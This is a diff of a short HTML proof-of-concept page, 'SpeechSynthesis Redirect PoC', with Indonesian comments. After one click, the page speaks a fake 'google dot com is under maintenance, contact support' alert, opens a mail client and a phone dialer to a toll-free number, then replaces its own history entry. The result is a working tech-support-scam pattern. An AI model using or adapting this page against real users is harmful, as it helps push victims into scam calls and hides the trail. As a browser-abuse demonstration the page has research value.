@@ -3,65 +3,86 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SpeechSynthesis Redirect PoC (Controlled)</title>
+<title>SpeechSynthesis Redirect PoC</title>
+
 <style>
-  body {
-    font-family: Arial, sans-serif;
-    text-align: center;
-    padding: 60px;
-  }
-  button {
-    padding: 15px 30px;
-    font-size: 20px;
-    cursor: pointer;
-  }
-  #status {
-    margin-top: 20px;
-    font-size: 18px;
-    color: darkred;
-  }
+body{
+  font-family: Arial, sans-serif;
+  text-align: center;
+  padding: 60px;
+}
+
+button{
+  padding: 15px 30px;
+  font-size: 20px;
+  cursor: pointer;
+}
+
+#status{
+  margin-top: 20px;
+  font-size: 18px;
+  color: darkred;
+}
 </style>
 </head>
+
 <body>
 
 <h2>CLICK TO GOOGLE</h2>
+
 <button id="speechBtn">CLICK CALL CENTER GOOGLE</button>
+
 <div id="status">Status: Waiting...</div>
 
 <script>
+
 const btn = document.getElementById('speechBtn');
 const status = document.getElementById('status');
 
 btn.addEventListener('click', () => {
 
-  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";
+  const text = "Attention: google dot com is currently under maintenance. Please contact support immediately.";
 
-  if (!('speechSynthesis' in window)) {
+  if(!('speechSynthesis' in window)){
     status.textContent = "SpeechSynthesis not supported.";
     return;
   }
 
   const utter = new SpeechSynthesisUtterance(text);
-  utter.lang = 'en-US';
+  utter.lang = "en-US";
 
   const voices = speechSynthesis.getVoices();
-  const enVoice = voices.find(v => v.lang.startsWith('en'));
-  if (enVoice) utter.voice = enVoice;
+  const enVoice = voices.find(v => v.lang.startsWith("en"));
+  if(enVoice) utter.voice = enVoice;
 
   status.textContent = "Preparing redirect...";
 
   setTimeout(() => {
 
+    // 🔊 Speech
     speechSynthesis.speak(utter);
-    console.log("[PoC] Speech triggered");
 
-    // buka tab google
-    window.open('https://google.com', '_blank');
+    // 🌐 buka google di tab baru
+    window.open("https://google.com","_blank");
 
-    // ganti history halaman ini supaya back tidak kembali ke PoC
-    window.location.replace('https://google.com');
+    // 📧 mail client
+    setTimeout(()=>{
+      window.location.href =
+      "mailto:support@google.com?subject=Support Request";
+    },200);
 
-  }, 300);
+    // 📞 dialer
+    setTimeout(()=>{
+      window.location.href =
+      "tel:+18005551234";
+    },400);
+
+    // 🔄 replace halaman
+    setTimeout(()=>{
+      window.location.replace("https://google.com");
+    },800);
+
+  },300);
 
 });
 </script>
